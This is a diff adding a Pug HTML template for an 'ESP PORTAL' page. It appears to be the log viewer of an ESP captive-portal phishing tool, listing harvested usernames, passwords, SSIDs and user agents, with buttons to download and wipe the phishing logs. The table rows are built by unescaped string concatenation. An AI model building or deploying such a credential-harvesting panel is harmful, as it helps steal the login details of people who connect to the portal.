@@ -1,0 +1,83 @@
+//output:../viewlogs.html
+doctype html
+html
+  head
+    meta(content="text/html;charset=utf-8" http-equiv="Content-Type")
+    meta(content="utf-8" http-equiv="encoding")
+    meta(name='viewport', content='width=device-width, initial-scale=0.8, minimal-ui')
+    title ESP PORTAL
+    link(rel='stylesheet', href='/milligram.min.css')
+    link(rel='stylesheet', href='/normalize.min.css')
+    link(rel='stylesheet', href='/main.css')
+    script(src='/jquery.slim.min.js')
+    script(src='/main.js')
+
+  body
+    main.wrapper
+    
+      nav.navigation
+        section.container
+          .navigation-title
+            a.button(href='/espportal') Home
+          .float-right.navigation-title ESPORTAL
+          
+      section.container
+        .row
+          .column
+            h1 View logs
+            
+            br  
+            .row
+              .column
+                h4 Connected stations
+                div(style=('overflow-x: scroll;'))
+                  table
+                    thead
+                      tr
+                        th url
+                        |       
+                        th ssid
+                        |       
+                        th channel
+                        |       
+                        th user
+                        |       
+                        th pass
+                        |       
+                        th userAgent
+                    |   
+                    tbody#phishingTable
+            a(href='/download_phish_logs').button Download logs
+            |  
+            a(href='/wipe_physh_logs').button.button-outline Wipe logs
+                
+            
+script.
+  function loadJson(){
+    getFile("/phishinglogs",function(res){
+      
+      var usercookie = document.cookie;
+      var arr = JSON.parse(res);
+      console.log(arr);
+      arr.forEach(function(json) {
+        console.log(json);
+        $("#phishingTable").append('<tr><td>'+json.url+'</td><td>'+json.ssid+'</td><td>'+json.channel+'</td><td>'+json.user+'</td><td>'+json.pass+'</td><td>'+json.userAgent+'</td></tr>');
+      });
+    });
+
+  }
+
+  
+
+
+  
+script.
+  
+  $(document).ready(function() {
+
+    loadJson();
+        
+  });
+  
+  
+  
